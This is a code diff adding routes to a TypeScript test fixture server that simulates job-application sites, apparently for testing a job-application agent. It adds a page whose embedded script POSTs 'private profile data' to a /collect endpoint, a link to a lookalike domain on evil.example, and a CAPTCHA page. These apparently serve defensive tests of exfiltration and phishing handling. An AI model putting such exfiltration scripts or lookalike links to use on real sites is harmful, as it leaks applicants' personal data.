@@ -9,6 +9,7 @@ export interface FixtureSubmission {
 export interface CareerFixtures {
   baseUrl: string;
   atsUrl: string;
+  jobicyAshbyUrl: string;
   close(): Promise<void>;
   submissions: FixtureSubmission[];
   readonly loginCount: number;
@@ -16,6 +17,7 @@ export interface CareerFixtures {
   readonly unknownVisits: number;
   readonly applyScriptVisits: number;
   resolveChallenge(): void;
+  resolveAshbyChallenge(): void;
   resolveMfa(): void;
   resolveUnknownAnswer(value: string): void;
 }
@@ -60,11 +62,18 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
   let applyScriptVisits = 0;
   let unknownAnswer = "";
   let challengeSolved = false;
+  let ashbyChallengeSolved = false;
   let mfaSolved = false;
   let atsUrl = "";
+  let baseUrl = "";
   const ats = createServer(async (req, res) => {
     const path = new URL(req.url || "/", "http://fixture.invalid").pathname;
     if (path === "/collect") { exfilCount++; await read(req); page(res, "collected"); return; }
+    if (path === "/ashby-challenge-state") { res.writeHead(200, { "Content-Type": "text/plain" }); res.end(ashbyChallengeSolved ? "solved" : "pending"); return; }
+    if (path === "/ashby-job") { page(res, `<main><h1>Software Engineer</h1><a href="/ashby-application">Apply for this job</a></main>`); return; }
+    if (path === "/ashby-job-external") { page(res, `<main><h1>Software Engineer</h1><a href="/ashby-external">Apply for this job</a></main>`); return; }
+    if (path === "/ashby-external") { page(res, `<form action="${baseUrl}/submit" method="post" enctype="multipart/form-data">${identity}${cv}<button type="submit">Submit application</button></form><script>fetch("${baseUrl}/collect",{method:"POST",body:"private profile data"}).catch(()=>{})</script>`); return; }
+    if (path === "/ashby-application") { page(res, `<main><h1 id="status">Verify you are human</h1><div class="captcha">CAPTCHA</div><form action="/submit" method="post" enctype="multipart/form-data">${identity}${cv}<label>Country <select name="country" required><option value="">Select</option><option>France</option><option>United States</option></select></label><label>Work authorization <select name="workAuthorization" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><label>Visa sponsorship <select name="visa_sponsorship" required><option value="">Select</option><option>Yes</option><option>No</option></select></label><label>Why this role? <textarea name="motivation" required></textarea></label><label>Gender (optional) <select name="gender"><option value="prefer-not-to-say">Prefer not to say</option><option>Female</option><option>Male</option></select></label><button type="submit">Submit application</button></form><script>setInterval(()=>fetch('/ashby-challenge-state').then(r=>r.text()).then(s=>{if(s==='solved'){document.querySelector('.captcha')?.remove();document.querySelector('#status').textContent='Apply for this job'}}),100)</script></main>`); return; }
     if (path === "/ats-apply" && !req.headers.cookie?.includes("ats=1")) { res.writeHead(302, { Location: "/ats-login" }); res.end(); return; }
     if (path === "/ats-login" && req.method === "POST") {
       const fields = new URLSearchParams((await read(req)).toString());
@@ -113,12 +122,16 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
       else page(res, `<h1>Application received</h1><p>Reference: REC-${submissions.length.toString().padStart(4, "0")}</p>`);
       return;
     }
+    if (path === "/collect") { exfilCount++; await read(req); page(res, "collected"); return; }
     if (req.method === "GET" && path === "/login-apply" && !req.headers.cookie?.includes("auth=1")) {
       res.writeHead(302, { Location: "/login" }); res.end(); return;
     }
     if (path === "/login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" required></label><button type="submit">Sign in</button></form>`); return; }
     if (path === "/readonly-login") { page(res, `<form action="/login" method="post"><label>Username <input name="username" required></label><label>Password <input type="password" name="password" readonly required></label><button type="submit">Sign in</button></form>`); return; }
     if (path === "/apply-link") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply for this job</a>`); return; }
+    if (path === "/jobicy-discovered") { page(res, `<main><h1>Software Engineer</h1><a href="${atsUrl}/ashby-job">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-ashby-lookalike") { page(res, `<main><h1>Software Engineer</h1><a href="https://jobs.ashbyhq.com.evil.example/acme/123">Apply for this job</a></main>`); return; }
+    if (path === "/jobicy-ashby-external") { page(res, `<main><h1>Software Engineer</h1><a href="${atsUrl}/ashby-job-external">Apply for this job</a></main>`); return; }
     if (path === "/ambiguous-apply") { page(res, `<h1>Software Engineer</h1><a href="/apply-page">Apply now</a><a href="/apply-page?source=secondary">Apply for this job</a>`); return; }
     if (path === "/apply-page") { page(res, `<h1>Application</h1><main id="application"></main><script src="/assets/application-form.js"></script>`); return; }
     if (path === "/lever-job") { page(res, `<main><h1>Product Engineer</h1><a href="/lever-job/apply">Apply for this job</a></main>`); return; }
@@ -150,15 +163,18 @@ export async function startCareerFixtures(): Promise<CareerFixtures> {
   await new Promise<void>(resolve => server.listen(0, "127.0.0.1", resolve));
   const address = server.address();
   if (!address || typeof address === "string") throw new Error("Fixture server did not listen");
+  baseUrl = `http://127.0.0.1:${address.port}`;
   return {
-    baseUrl: `http://127.0.0.1:${address.port}`,
+    baseUrl,
     atsUrl,
+    jobicyAshbyUrl: `${baseUrl}/jobicy-discovered`,
     submissions,
     get loginCount() { return loginCount; },
     get exfilCount() { return exfilCount; },
     get unknownVisits() { return unknownVisits; },
     get applyScriptVisits() { return applyScriptVisits; },
     resolveChallenge: () => { challengeSolved = true; },
+    resolveAshbyChallenge: () => { ashbyChallengeSolved = true; },
     resolveMfa: () => { mfaSolved = true; },
     resolveUnknownAnswer: value => { unknownAnswer = value; },
     close: async () => { await new Promise<void>((resolve, reject) => server.close(err => err ? reject(err) : resolve())); await new Promise<void>((resolve, reject) => ats.close(err => err ? reject(err) : resolve())); },
